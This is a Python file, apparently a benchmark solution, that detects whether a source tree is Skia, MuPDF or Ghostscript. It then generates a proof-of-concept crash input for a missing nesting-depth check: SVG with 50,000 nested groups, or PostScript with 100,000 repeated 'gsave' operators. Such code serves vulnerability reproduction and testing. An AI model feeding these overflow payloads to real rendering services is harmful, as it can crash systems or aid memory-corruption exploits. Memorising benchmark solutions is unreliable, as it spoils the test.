import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability "nesting depth is not checked before pushing a clip mark" 
        strongly suggests a stack overflow or heap buffer overflow in a graphics state stack
        (like Ghostscript's gstate stack or Skia's save/clip stack).
        
        We scan the source path to identify the library and generate an appropriate 
        deeply nested input.
        """
        
        target = "ghostscript" # Default to Ghostscript as "clip mark" is specific terminology there
        
        # Heuristic detection
        for root, dirs, files in os.walk(src_path):
            lower_root = root.lower()
            if 'skia' in lower_root or 'skcanvas.cpp' in [f.lower() for f in files]:
                target = "skia"
                break
            if 'mupdf' in lower_root or 'fitz.h' in files:
                target = "mupdf"
                break
            if 'ghostscript' in lower_root or 'gsmain.c' in files or 'psi' in dirs:
                target = "ghostscript"
                break
        
        if target == "skia":
            # Skia: Trigger nesting depth issues via SVG <g> nesting
            # Skia's SVG parser pushes state for each group.
            # 50,000 depth ensures we exceed typical stack limits/buffer sizes.
            depth = 50000
            payload = b'<svg xmlns="http://www.w3.org/2000/svg">'
            payload += b"<g>" * depth
            payload += b"</g>" * depth
            payload += b"</svg>"
            return payload
            
        elif target == "mupdf":
            # MuPDF: Also susceptible to deep nesting in structured formats like SVG
            depth = 50000
            payload = b'<svg xmlns="http://www.w3.org/2000/svg">'
            payload += b"<g>" * depth
            payload += b"</g>" * depth
            payload += b"</svg>"
            return payload
            
        else:
            # Ghostscript: Trigger gstate stack overflow
            # `gsave` pushes the current graphics state (including clip path) onto the stack.
            # Repeated `gsave` without `grestore` increases stack depth.
            # If the check is missing, this causes a heap buffer overflow.
            # We use 100,000 iterations to generate a substantial file (~600KB) 
            # which is close to the ground truth magnitude but likely efficient enough.
            count = 100000
            payload = b"%!PS\n" + b"gsave " * count
            return payload
